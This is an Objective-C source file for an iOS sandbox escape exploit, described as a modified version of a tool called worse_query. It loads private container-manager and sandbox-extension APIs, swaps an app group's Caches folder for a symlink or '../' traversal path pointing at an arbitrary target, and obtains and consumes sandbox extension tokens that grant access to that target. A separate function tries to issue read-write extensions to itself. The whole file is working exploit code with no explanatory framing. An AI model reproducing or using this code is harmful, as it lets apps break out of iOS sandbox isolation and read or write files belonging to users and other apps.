//
//  worse_query.m
//  IOSurfaceSafeProbe
//
//  Based on worse_query by Taj C (forcequit) - GPL-3.0
//  Modified with alternative sandbox activation and path traversal.
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int (*container_object_sandbox_extension_activate_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);
typedef char *(*sandbox_extension_issue_file_fn)(const char *, const char *, uint32_t);

static void clean_symlink(NSString *group) {
    if (group != NULL) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
            [files removeItemAtURL: caches error: nil];
            [files createDirectoryAtURL: caches withIntermediateDirectories: false attributes: nil error: nil];
        }
    }
}

static NSString *buildTraversalPath(NSString *groupCachesPath, NSString *target) {
    NSArray *components = [groupCachesPath pathComponents];
    NSUInteger depth = components.count;
    NSMutableString *traversal = [NSMutableString string];
    for (NSUInteger i = 0; i < depth; i++) {
        [traversal appendString:@"../"];
    }
    NSString *stripped = target;
    while ([stripped hasPrefix:@"/"]) {
        stripped = [stripped substringFromIndex:1];
    }
    [traversal appendString:stripped];
    return traversal;
}

static int64_t try_query(NSString *symlinkDest, NSString *caches, NSString *group, uint64_t flags, NSFileManager *files, void *mgr,
    container_query_create_fn query_create, container_query_set_class_fn query_set_class,
    container_query_set_identifiers_fn query_set_group_identifiers, container_query_set_flags_fn query_set_flags,
    container_query_set_part_fn query_set_part, container_query_get_single_result_fn query_get_single_result,
    container_query_free_fn query_free, container_copy_sandbox_token_fn copy_sandbox_token,
    container_object_sandbox_extension_activate_fn activate_extension, sandbox_extension_consume_fn consume_extension) {

    [files removeItemAtPath: caches error: nil];
    if (![files createSymbolicLinkAtPath: caches withDestinationPath: symlinkDest error: nil]) return -4;

    void *query = query_create();
    if (!query) return -3;

    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_class(query, 7);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);
    query_set_flags(query, flags);

    void *result = query_get_single_result(query);
    if (!result) { query_free(query); return -5; }

    // Try activate first
    if (activate_extension) {
        int r = activate_extension(result);
        NSLog(@"[worse_query] activate returned %d for flags=0x%llx", r, flags);
        if (r == 0) { query_free(query); return 1; }
    }

    // Try copy_sandbox_token
    if (copy_sandbox_token) {
        char *token = copy_sandbox_token(result);
        if (token) {
            int64_t handle = consume_extension(token);
            query_free(query); free(token);
            NSLog(@"[worse_query] copy_sandbox_token handle=%lld flags=0x%llx", handle, flags);
            return handle > 0 ? handle : -7;
        }
    }

    // Try alternate API: container_copy_sandbox_extension_token
    container_copy_sandbox_token_fn copy_ext_token = dlsym(mgr, "container_copy_sandbox_extension_token");
    if (copy_ext_token) {
        char *token = copy_ext_token(result);
        if (token) {
            int64_t handle = consume_extension(token);
            query_free(query); free(token);
            NSLog(@"[worse_query] copy_ext_token handle=%lld flags=0x%llx", handle, flags);
            return handle > 0 ? handle : -7;
        }
    }

    query_free(query);
    return -6;
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }

    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) return -1;
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = dlsym(mgr, "container_copy_sandbox_token");
    container_object_sandbox_extension_activate_fn activate_extension = dlsym(mgr, "container_object_sandbox_extension_activate");
    sandbox_extension_consume_fn consume_extension = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !consume_extension) {
        dlclose(mgr); return -2;
    }

    uint64_t flags_a = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    uint64_t flags_b = alt_flags ? 0x0000008000000000ULL : 0x0000000800000000ULL;
    NSString *traversal = buildTraversalPath(caches, target);

    // Method 1: Direct symlink with primary flags
    int64_t handle = try_query(target, caches, group, flags_a, files, mgr,
        query_create, query_set_class, query_set_group_identifiers, query_set_flags,
        query_set_part, query_get_single_result, query_free, copy_sandbox_token,
        activate_extension, consume_extension);
    if (handle > 0) { clean_symlink(group); dlclose(mgr); return handle; }

    // Method 2: Path traversal with primary flags
    int64_t handle2 = try_query(traversal, caches, group, flags_a, files, mgr,
        query_create, query_set_class, query_set_group_identifiers, query_set_flags,
        query_set_part, query_get_single_result, query_free, copy_sandbox_token,
        activate_extension, consume_extension);
    if (handle2 > 0) { clean_symlink(group); dlclose(mgr); return handle2; }

    // Method 3: Direct symlink with alternate flags
    int64_t handle3 = try_query(target, caches, group, flags_b, files, mgr,
        query_create, query_set_class, query_set_group_identifiers, query_set_flags,
        query_set_part, query_get_single_result, query_free, copy_sandbox_token,
        activate_extension, consume_extension);
    if (handle3 > 0) { clean_symlink(group); dlclose(mgr); return handle3; }

    // Method 4: Path traversal with alternate flags
    int64_t handle4 = try_query(traversal, caches, group, flags_b, files, mgr,
        query_create, query_set_class, query_set_group_identifiers, query_set_flags,
        query_set_part, query_get_single_result, query_free, copy_sandbox_token,
        activate_extension, consume_extension);

    clean_symlink(group);
    dlclose(mgr);
    return handle4;
}

int64_t worse_query_issue_self(NSString *target) {
    sandbox_extension_issue_file_fn issue = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file_to_self");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!issue || !consume) {
        NSLog(@"[worse_query] sandbox_extension_issue_file_to_self not available");
        return -2;
    }

    const char *ext_classes[] = {
        "com.apple.app-sandbox.read-write",
        "com.apple.app-sandbox.read",
        "com.apple.sandbox.container",
    };

    for (int i = 0; i < 3; i++) {
        char *token = issue(ext_classes[i], target.fileSystemRepresentation, 0);
        if (token) {
            int64_t h = consume(token);
            free(token);
            if (h > 0) {
                NSLog(@"[worse_query] issue_self succeeded: %s (handle %lld)", ext_classes[i], h);
                return h;
            }
            NSLog(@"[worse_query] issue_self %s: consume=%lld", ext_classes[i], h);
        }
    }
    return -8;
}

void worse_query_release(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn release_extension = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
